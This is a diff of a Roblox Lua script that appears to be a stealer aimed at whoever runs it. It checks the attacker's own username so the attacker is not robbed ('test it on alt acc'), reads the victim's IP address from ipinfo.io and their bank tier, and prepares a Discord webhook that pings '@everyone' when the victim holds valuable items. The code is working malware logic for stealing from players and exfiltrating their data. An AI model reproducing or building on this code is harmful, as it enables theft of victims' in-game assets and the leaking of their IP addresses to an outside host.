@@ -70,21 +70,33 @@ end
 getexploit()
 
 local idiotuser = game:GetService("Players").LocalPlayer.Name
-local url = Webhook
-if UserName == nil then
-    game:GetService("Players").LocalPlayer:Kick("Put A Username")
-    return;
-end
-local worked = pcall(function()
-    game:GetService("Players"):GetNameFromUserIdAsync(UserName)
-end)
-if not worked then
-    game:GetService("Players").LocalPlayer:Kick("Put A Valid UserId!")
-    return;
-end
-local UserName = game:GetService("Players"):GetNameFromUserIdAsync(UserName)
+
 if idiotuser == UserName then
-    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test on alt)")
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
+    return;
+end
+if UserName == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+    return;
+end
+local worked2 = pcall(function()
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end)
+if not worked2 then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
+    return;
+end
+if worked2 then
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end
+if UserName2 ~= nil then
+    local worked3 = pcall(function()
+        game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
+    end)
+    if not worked3 then
+        game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
+        return;
+    end
 end
 -- Checks
 
@@ -1198,6 +1210,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local banktier = SuperBank["Tier"]
 local lmao = "/5"
 local ping
+local url = Webhook
     if #HList ~= 0 or #BHList ~= 0 then
         ping = "@everyone"
     elseif #HList == 0 and #BHList == 0 then
